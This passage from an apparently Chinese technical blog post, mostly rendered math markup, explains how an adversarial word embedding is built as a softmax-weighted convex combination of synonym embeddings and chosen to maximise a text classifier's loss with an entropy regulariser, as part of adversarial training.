2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right: 0.0359em;">v</span><span class="mopen">(</span><span class="mord mathbb">S</span><span class="mopen">(</span><span class="mord mathnormal">u</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">∣</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position: relative; top: 0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.9812em;"><span class="" style="top: -2.4003em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span class="" style="top: -3.2029em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right: 0.1389em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2997em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: -0.0269em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 0.8389em; vertical-align: -0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: -0.0269em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">&gt;=</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord">0</span><span class="mclose">}</span></span></span></span></span></em></p> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/1d/85/E1zGWiQs_o.png" alt="在这里插入图片描述" width="300"></p> 
<p>对于当前单词<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         u 
        
       
         = 
        
       
      
        u= 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.4306em;"></span><span class="mord mathnormal">u</span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">=</span></span></span></span></span>’awesome‘，其候选替换单词（WordNet synonyms给出）为四个红点，则<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         u 
        
       
      
        u 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.4306em;"></span><span class="mord mathnormal">u</span></span></span></span></span>的凸集为四个红点单词对应word embedding的加权和。</p> 
<h6><a id="4133_Finding_an_adversary_embedding_in_the_convex_hull_is_just_finding_the_coefficient_of_the_linear_combination_724"></a>4.1.3.3. Finding an adversary embedding in the convex hull is just finding the coefficient of the linear combination</h6> 
<p>对于目标adversarial sample <span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
         
         
           v 
          
         
           ( 
          
          
          
            u 
           
          
            i 
           
          
         
           ) 
          
         
        
          ^ 
         
        
       
      
        \hat{v(u_i)} 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.2634em; vertical-align: -0.25em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.0134em;"><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0359em;">v</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mclose">)</span></span></span><span class="" style="top: -3.319em;"><span class="pstrut" style="height: 3em;"></span><span class="accent-body" style="left: -0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.25em;"><span class=""></span></span></span></span></span></span></span></span></span>，公式为：<br> <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"> 
      
       
        
         
         
           v 
          
         
           ^ 
          
         
        
          ( 
         
         
         
           x 
          
         
           i 
          
         
        
          ) 
         
        
          = 
         
         
         
           ∑ 
          
          
          
            j 
           
          
            = 
           
          
            1 
           
          
         
           T 
          
         
         
         
           w 
          
          
          
            i 
           
          
            j 
           
          
         
        
          v 
         
        
          ( 
         
        
          S 
         
        
          ( 
         
         
         
           u 
          
         
           i 
          
         
         
         
           ) 
          
         
           j 
          
         
        
          ) 
         
        
          , 
         
        
            
         
        
          s 
         
        
          . 
         
        
          t 
         
        
          . 
         
        
            
         
         
         
           ∑ 
          
          
          
            j 
           
          
            = 
           
          
            1 
           
          
         
           T 
          
         
         
         
           w 
          
          
          
            i 
           
          
            j 
           
          
         
        
          = 
         
        
          1 
         
        
          , 
         
        
            
         
         
         
           w 
          
          
          
            i 
           
          
            j 
           
          
         
        
          &gt; 
         
        
          = 
         
        
          0 
         
        
       
         \hat{v}(x_i) = \sum^T_{j=1}w_{ij}v(\mathbb{S}(u_i)_j), \ s.t.\ \sum^{T}_{j=1}w_{ij}=1, \ w_{ij} &gt;=0 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.6944em;"><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="mord mathnormal" style="margin-right: 0.0359em;">v</span></span><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="accent-body" style="left: -0.2222em;"><span class="mord">^</span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 3.2421em; vertical-align: -1.4138em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.8283em;"><span class="" style="top: -1.8723em; margin-left: 0em;"><span class="pstrut" style="height: 3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span class="" style="top: -3.05em;"><span class="pstrut" style="height: 3.05em;"></span><span class=""><span class="mop op-symbol large-op">∑</span></span></span><span class="" style="top: -4.3em; margin-left: 0em;"><span class="pstrut" style="height: 3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right: 0.1389em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 1.4138em;"><span class=""></span></span></span></span></span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: -0.0269em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em;"><span class=""></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right: 0.0359em;">v</span><span class="mopen">(</span><span class="mord mathbb">S</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em;"><span class=""></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord mathnormal">s</span><span class="mord">.</span><span class="mord mathnormal">t</span><span class="mord">.</span><span class="mspace"> </span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.8283em;"><span class="" style="top: -1.8723em; margin-left: 0em;"><span class="pstrut" style="height: 3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span class="" style="top: -3.05em;"><span class="pstrut" style="height: 3.05em;"></span><span class=""><span class="mop op-symbol large-op">∑</span></span></span><span class="" style="top: -4.3em; margin-left: 0em;"><span class="pstrut" style="height: 3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right: 0.1389em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 1.4138em;"><span class=""></span></span></span></span></span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: -0.0269em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 0.9305em; vertical-align: -0.2861em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: -0.0269em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">&gt;=</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 0.6444em;"></span><span class="mord">0</span></span></span></span></span></span><br> 对于各个候选替换word embedding的权重<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          w 
         
         
         
           i 
          
         
           j 
          
         
        
       
      
        w_{ij} 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.7167em; vertical-align: -0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: -0.0269em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em;"><span class=""></span></span></span></span></span></span></span></span></span></span>，公式为：<br> <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"> 
      
       
        
         
         
           w 
          
          
          
            i 
           
          
            j 
           
          
         
        
          = 
         
         
          
          
            e 
           
          
            x 
           
          
            p 
           
          
            ( 
           
           
            
            
              w 
             
            
              ^ 
             
            
            
            
              i 
             
            
              j 
             
            
           
          
            ) 
           
          
          
           
           
             ∑ 
            
            
            
              j 
             
            
              = 
             
            
              1 
             
            
           
             T 
            
           
          
            e 
           
          
            x 
           
          
            p 
           
          
            ( 
           
           
            
            
              w 
             
            
              ^ 
             
            
            
            
              i 
             
            
              j 
             
            
           
          
            ) 
           
          
         
        
          , 
         
        
            
         
         
          
          
            w 
           
          
            ^ 
           
          
          
          
            i 
           
          
            j 
           
          
         
        
          ∈ 
         
        
          R 
         
        
       
         w_{ij}=\frac{exp(\hat{w}_{ij})}{\sum^{T}_{j=1}exp(\hat{w}_{ij})}, \ \hat{w}_{ij} \in R 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.7167em; vertical-align: -0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: -0.0269em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 2.734em; vertical-align: -1.307em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.427em;"><span class="" style="top: -2.1288em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position: relative; top: 0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.9812em;"><span class="" style="top: -2.4003em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span class="" style="top: -3.2029em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right: 0.1389em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.4358em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.6944em;"><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="mord mathnormal" style="margin-right: 0.0269em;">w</span></span><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="accent-body" style="left: -0.1667em;"><span class="mord">^</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: -0.0269em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em;"><span class=""></span></span></span></span></span></span><span class="mclose">)</span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.677em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.6944em;"><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="mord mathnormal" style="margin-right: 0.0269em;">w</span></span><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="accent-body" style="left: -0.1667em;"><span class="mord">^</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: -0.0269em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em;"><span class=""></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 1.307em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord"><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.6944em;"><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="mord mathnormal" style="margin-right: 0.0269em;">w</span></span><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="accent-body" style="left: -0.1667em;"><span class="mord">^</span></span></span></span></span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: -0.0269em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 0.6833em;"></span><span class="mord mathnormal" style="margin-right: 0.0077em;">R</span></span></span></span></span></span><br> 我们的目标是，寻找合适的<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          w 
         
        
          ^ 
         
        
       
      
        \hat{w} 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6944em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.6944em;"><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="mord mathnormal" style="margin-right: 0.0269em;">w</span></span><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="accent-body" style="left: -0.1667em;"><span class="mord">^</span></span></span></span></span></span></span></span></span></span></span>，使得<br> <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          m 
         
        
          a 
         
         
         
           x 
          
          
          
            w 
           
          
            ^ 
           
          
         
        
          − 
         
        
          l 
         
        
          o 
         
        
          g 
         
        
            
         
        
          p 
         
        
          ( 
         
        
          y 
         
        
          ∣ 
         
         
         
           v 
          
         
           ^ 
          
         
        
          ( 
         
        
          x 
         
        
          ) 
         
        
          ) 
         
        
       
         max_{\hat{w}} -log \ p(y | \hat{v}(x)) 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.7333em; vertical-align: -0.15em;"></span><span class="mord mathnormal">ma</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3361em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord accent mtight"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.6944em;"><span class="" style="top: -2.7em;"><span class="pstrut" style="height: 2.7em;"></span><span class="mord mathnormal mtight" style="margin-right: 0.0269em;">w</span></span><span class="" style="top: -2.7em;"><span class="pstrut" style="height: 2.7em;"></span><span class="accent-body" style="left: -0.1667em;"><span class="mord mtight">^</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.2222em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal" style="margin-right: 0.0197em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right: 0.0359em;">g</span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right: 0.0359em;">y</span><span class="mord">∣</span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.6944em;"><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="mord mathnormal" style="margin-right: 0.0359em;">v</span></span><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="accent-body" style="left: -0.2222em;"><span class="mord">^</span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">))</span></span></span></span></span></span><br> 即，寻找合适的<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          w 
         
        
          ^ 
         
        
       
      
        \hat{w} 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6944em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.6944em;"><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="mord mathnormal" style="margin-right: 0.0269em;">w</span></span><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="accent-body" style="left: -0.1667em;"><span class="mord">^</span></span></span></span></span></span></span></span></span></span></span>，使得训练模型的Loss最大。但是，对于上面的 Loss，论文中还加了另外一部分<br> <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          − 
         
        
          α 
         
         
         
           ∑ 
          
          
          
            i 
           
          
            = 
           
          
            1 
           
          
         
           L 
          
         
         
         
           1 
          
         
           L 
          
         
         
         
           H 
          
         
           ( 
          
          
          
            w 
           
          
            i 
           
          
         
           ) 
          
         
         
        
          H 
         
        
          ( 
         
         
         
           w 
          
         
           i 
          
         
        
          ) 
         
        
          = 
         
         
         
           ∑ 
          
          
          
            j 
           
          
            = 
           
          
            1 
           
          
         
           T 
          
         
        
          − 
         
         
         
           w 
          
          
          
            i 
           
          
            j 
           
          
         
        
          l 
         
        
          o 
         
        
          g 
         
        
          ( 
         
         
         
           w 
          
          
          
            i 
           
          
            j 
           
          
         
        
          ) 
         
        
       
         -\alpha \sum^L_{i=1} \frac{1}{L}\mathcal{H(w_i)} \\ \mathcal{H}(w_i)=\sum^{T}_{j=1} -w_{ij}log(w_{ij}) 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 3.106em; vertical-align: -1.2777em;"></span><span class="mord">−</span><span class="mord mathnormal" style="margin-right: 0.0037em;">α</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.8283em;"><span class="" style="top: -1.8723em; margin-left: 0em;"><span class="pstrut" style="height: 3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span class="" style="top: -3.05em;"><span class="pstrut" style="height: 3.05em;"></span><span class=""><span class="mop op-symbol large-op">∑</span></span></span><span class="" style="top: -4.3em; margin-left: 0em;"><span class="pstrut" style="height: 3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">L</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 1.2777em;"><span class=""></span></span></span></span></span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.3214em;"><span class="" style="top: -2.314em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord mathnormal">L</span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.677em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.686em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mord mathcal" style="margin-right: 0.0097em;">H</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: -0.0269em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mclose">)</span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathcal" style="margin-right: 0.0097em;">H</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: -0.0269em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 3.2421em; vertical-align: -1.4138em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.8283em;"><span class="" style="top: -1.8723em; 